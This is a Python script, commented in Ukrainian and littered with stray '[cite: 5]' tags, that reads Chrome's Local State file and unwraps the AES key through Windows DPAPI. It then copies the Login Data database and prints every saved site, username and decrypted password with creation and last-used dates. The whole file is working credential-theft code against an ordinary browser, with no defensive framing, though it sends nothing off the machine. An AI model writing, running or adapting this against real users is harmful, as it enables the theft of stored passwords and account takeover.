import os #
import json #
import base64 #
import sqlite3 #
import win32crypt #
from Crypto.Cipher import AES #
import shutil #
from datetime import timezone, datetime, timedelta #

def get_chrome_datetime(chromedate): #[cite: 5]
    """Перетворює формат дати Chrome у зручний формат datetime. 
    Chrome рахує мікросекунди починаючи з 1 січня 1601 року.""" #[cite: 5]
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate) #[cite: 5]

def get_encryption_key(): #[cite: 5]
    """Витягує та декодує AES ключ, яким зашифровані паролі.""" #[cite: 5]
    local_state_path = os.path.join(os.environ["USERPROFILE"], 
                                    "AppData", "Local", "Google", "Chrome", 
                                    "User Data", "Local State") #[cite: 5]
    with open(local_state_path, "r", encoding="utf-8") as f: #[cite: 5]
        local_state = f.read() #[cite: 5]
        
    local_state = json.loads(local_state) #[cite: 5]
    
    # Декодуємо ключ з Base64 #[cite: 5]
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) #[cite: 5]
    # Видаляємо префікс DPAPI (перші 5 байтів 'DPAPI') #[cite: 5]
    key = key[5:] #[cite: 5]
    
    # Розшифровуємо ключ за допомогою ключа сесії поточного користувача Windows #[cite: 5]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] #[cite: 5]

def decrypt_password(password, key): #[cite: 5]
    """Приймає зашифрований пароль і ключ AES, повертає розшифрований пароль.""" #[cite: 5]
    try:
        # Отримуємо вектор ініціалізації (IV) #[cite: 5]
        iv = password[3:15] #[cite: 5]
        password = password[15:] #[cite: 5]
        
        # Генеруємо шифратор AES GCM #[cite: 5]
        cipher = AES.new(key, AES.MODE_GCM, iv) #[cite: 5]
        
        # Розшифровуємо пароль (відкидаємо останні 16 байтів - authentication tag) #[cite: 5]
        return cipher.decrypt(password)[:-16].decode() #[cite: 5]
    except:
        try:
            # Старий метод шифрування (до версії Chrome 80) #[cite: 5]
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) #[cite: 5]
        except:
            return "" #[cite: 5]

def main(): #[cite: 5]
    # Отримуємо ключ AES #[cite: 5]
    key = get_encryption_key() #[cite: 5]
    
    # Шлях до локальної SQLite бази даних Chrome з паролями #[cite: 5]
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data") #[cite: 5]
                           
    # Копіюємо файл, щоб уникнути помилки блокування, якщо Chrome відкрито #[cite: 5]
    filename = "ChromeData.db" #[cite: 5]
    shutil.copyfile(db_path, filename) #[cite: 5]
    
    # Підключаємося до скопійованої бази даних #[cite: 5]
    db = sqlite3.connect(filename) #[cite: 5]
    cursor = db.cursor() #[cite: 5]
    
    # Таблиця logins містить потрібні нам дані #[cite: 5]
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created") #[cite: 5]
    
    # Перебираємо всі рядки #[cite: 5]
    for row in cursor.fetchall(): #[cite: 5]
        origin_url = row[0] #[cite: 5]
        action_url = row[1] #[cite: 5]
        username = row[2] #[cite: 5]
        password = decrypt_password(row[3], key) #[cite: 5]
        date_created = row[4] #[cite: 5]
        date_last_used = row[5] #[cite: 5]
        
        if username or password: #[cite: 5]
            print(f"Origin URL: {origin_url}") #[cite: 5]
            print(f"Action URL: {action_url}") #[cite: 5]
            print(f"Username: {username}") #[cite: 5]
            print(f"Password: {password}") #[cite: 5]
        else:
            continue #[cite: 5]
            
        if date_created != 86400000000 and date_created: #[cite: 5]
            print(f"Creation date: {str(get_chrome_datetime(date_created))}") #[cite: 5]
            
        if date_last_used != 86400000000 and date_last_used: #[cite: 5]
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}") #[cite: 5]
            
        print("="*50) #[cite: 5]
        
    cursor.close() #[cite: 5]
    db.close() #[cite: 5]
    
    # Видаляємо скопійований файл БД #[cite: 5]
    try:
        os.remove(filename) #[cite: 5]
    except:
        pass #[cite: 5]

if __name__ == "__main__": #[cite: 5]
    main() #[cite: 5]